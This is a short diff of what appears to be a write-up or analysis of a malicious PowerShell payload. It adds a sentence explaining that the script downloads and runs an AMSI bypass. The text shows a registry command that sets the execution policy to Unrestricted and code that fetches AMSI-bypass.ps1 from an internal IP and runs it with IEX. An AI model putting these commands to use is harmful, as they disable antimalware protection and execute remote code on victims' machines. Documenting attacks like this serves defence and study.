@@ -132,6 +132,9 @@ $parameters=@("arg1", "arg2")
 First, the payload script would change PowerShell’s running configuration so the current user would be allowed to execute PowerShell scripts with no restrictions, using the following command:
 
 New-ItemProperty -Path 'HKCU:Software\Microsoft\PowerShell\1\ShellIds\Microsoft.PowerShell' -Name 'ExecutionPolicy' -Value "Unrestricted" -PropertyType String -Force
+
+Secondly the script will download and execute an AMSI patch bypass 
+ 
 $wr = [System.NET.webRequest]::Create('http://192.168.1.125/AMSI-bypass.ps1')
 $r = $wr.GetResponse()
 IEX ([System.IO.StreamReader]($r.GetResponseStream())).ReadToEnd()
